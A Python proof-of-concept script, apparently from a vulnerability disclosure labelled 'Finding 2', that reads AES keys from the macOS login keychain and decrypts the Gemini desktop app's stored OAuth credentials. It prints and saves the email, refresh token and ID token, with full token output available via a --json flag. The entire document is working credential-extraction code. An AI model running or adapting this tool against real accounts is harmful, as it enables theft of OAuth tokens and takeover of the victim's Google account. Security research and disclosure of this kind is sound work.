#!/usr/bin/env python3
"""Finding 2 — decrypt the Gemini app's OAuth credential store.

The app persists its OAuth credential protobuf (StoredCredentialData: gaia_id,
email, scopes, refresh_token, id_token, …) at:

    ~/Library/Application Support/com.google.GeminiMacOS/Data/user1/auth

File format (reverse-engineered):
    bytes 0–7   : magic 2ebafeca ×2
    bytes 8–11  : version word (0x00000017)
    bytes 12–34 : protobuf header  -> field 4 = 12-byte AES-GCM nonce
                                       field 5 = ciphertext length
    bytes 35–  : ciphertext || 16-byte GCM tag

The AES-256-GCM keys are NOT in this repo. They are read at runtime from the
user's login keychain ("Gemini Safe Storage" / acct "Gemini Keys"), where the
app keeps a protobuf blob containing two 32-byte keys. Running this script on
YOUR machine with YOUR signed-in app reproduces the extraction on your own data.

Usage:
    python3 decrypt_auth.py            # prints + writes /tmp/gemini_auth_decrypted.bin
    python3 decrypt_auth.py --json     # prints extracted credential fields as JSON
"""
import argparse
import json
import os
import re
import subprocess
import sys

from cryptography.hazmat.primitives.ciphers.aead import AESGCM, ChaCha20Poly1305

KEYCHAIN_SERVICE = 'Gemini Safe Storage'
AUTH_PATH = os.path.expanduser(
    '~/Library/Application Support/com.google.GeminiMacOS/Data/user1/auth')
MAGIC = b'\x2e\xba\xfe\xca'


def read_varint(d, i):
    v, s = 0, 0
    while i < len(d):
        b = d[i]; i += 1
        v |= (b & 0x7F) << s
        if not (b & 0x80):
            return v, i
        s += 7
    return v, i


def parse_proto(d):
    fields, i = [], 0
    while i < len(d):
        tag, i = read_varint(d, i)
        fn, wt = (tag >> 3) & 0x1F, tag & 0x7
        if wt == 0:
            v, i = read_varint(d, i)
            fields.append((fn, 'varint', v))
        elif wt == 2:
            ln, i = read_varint(d, i)
            fields.append((fn, 'bytes', d[i:i + ln]))
            i += ln
        elif wt == 1:
            fields.append((fn, 'fixed64', d[i:i + 8])); i += 8
        elif wt == 5:
            fields.append((fn, 'fixed32', d[i:i + 4])); i += 4
        else:
            break
    return fields


def keychain_keys():
    """Pull the app's AES keys from the login keychain at runtime."""
    out = subprocess.run(
        ['security', 'find-generic-password', '-s', KEYCHAIN_SERVICE, '-w'],
        capture_output=True, text=True)
    if out.returncode != 0:
        raise SystemExit(f'keychain read failed: {out.stderr.strip()}')
    hexstr = out.stdout.strip()
    try:
        blob = bytes.fromhex(hexstr)
    except ValueError:
        raise SystemExit('keychain blob is not hex — unexpected keychain format')

    keys = []
    for fn, wt, val in parse_proto(blob):
        if fn == 2 and wt == 'bytes':
            for nfn, nwt, nval in parse_proto(val):
                if nfn == 4 and nwt == 'bytes' and len(nval) == 32:
                    keys.append(nval)
    if not keys:
        raise SystemExit('no 32-byte keys found in keychain blob')
    return keys


def decrypt_auth(data, keys):
    """Try the recovered key/offset matrix against the credential store."""
    nonce = data[20:32]
    candidates = [(data[35:], 'ct@35'), (data[30:], 'ct@30'), (data[37:], 'ct@37')]
    aads = [None, data[:8], data[:12], data[:35]]

    for ki, key in enumerate(keys, 1):
        for ct, clabel in candidates:
            for aad in aads:
                for cipher, name in ((AESGCM, 'AES-256-GCM'),
                                     (ChaCha20Poly1305, 'ChaCha20-Poly1305')):
                    try:
                        pt = cipher(key).decrypt(nonce, ct, aad)
                        return pt, {
                            'key_index': ki,
                            'cipher': name,
                            'ciphertext_layout': clabel,
                            'aad': 'none' if aad is None else f'{len(aad)}B header',
                            'nonce_offset': 20,
                        }
                    except Exception:
                        continue
    return None, None


def parse_stored_credential(pt):
    """Map StoredCredentialData protobuf fields to names (schema from binary)."""
    names = {1: 'gaia_id', 2: 'email', 3: 'profile_name', 4: 'refresh_token',
             5: 'scopes', 6: 'id_token', 7: 'hosted_domain', 8: 'is_fst',
             10: 'display_name', 11: 'profile_photo_url'}
    out = {}
    for fn, wt, v in parse_proto(pt):
        if wt == 'bytes':
            try:
                s = v.decode('utf-8')
                printable = all(32 <= ord(c) < 127 or c in '\n\t' for c in s)
            except UnicodeDecodeError:
                printable = False
            out[names.get(fn, f'field_{fn}')] = s if printable else v.hex()[:80]
        else:
            out[names.get(fn, f'field_{fn}')] = v
    return out


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument('--auth-path', default=AUTH_PATH)
    ap.add_argument('--json', action='store_true')
    args = ap.parse_args()

    data = open(args.auth_path, 'rb').read()
    if not data.startswith(MAGIC + MAGIC):
        raise SystemExit(f'{args.auth_path} does not start with the 2ebafeca magic')
    print(f'auth store: {len(data)} bytes', file=sys.stderr)

    keys = keychain_keys()
    print(f'recovered {len(keys)} AES key(s) from keychain', file=sys.stderr)

    pt, meta = decrypt_auth(data, keys)
    if pt is None:
        raise SystemExit('decryption failed — key/offset matrix exhausted')

    print(f"decrypted via {meta['cipher']} with key #{meta['key_index']} "
          f"({meta['ciphertext_layout']}, aad={meta['aad']})", file=sys.stderr)

    fields = parse_stored_credential(pt)
    with open('/tmp/gemini_auth_decrypted.bin', 'wb') as f:
        f.write(pt)

    if args.json:
        print(json.dumps({'decryption': meta, 'fields': fields}, indent=2))
    else:
        print('\n=== Finding 2: credential store decrypted ===')
        for k, v in fields.items():
            shown = v if len(str(v)) <= 100 else str(v)[:100] + '…'
            print(f'  {k:18s}: {shown}')
        if 'refresh_token' in fields:
            print(f"\n  refresh_token begins with: {fields['refresh_token'][:6]}… "
                  '(full value deliberately not printed — use --json locally)')
    print('\nplaintext written to /tmp/gemini_auth_decrypted.bin', file=sys.stderr)


if __name__ == '__main__':
    main()
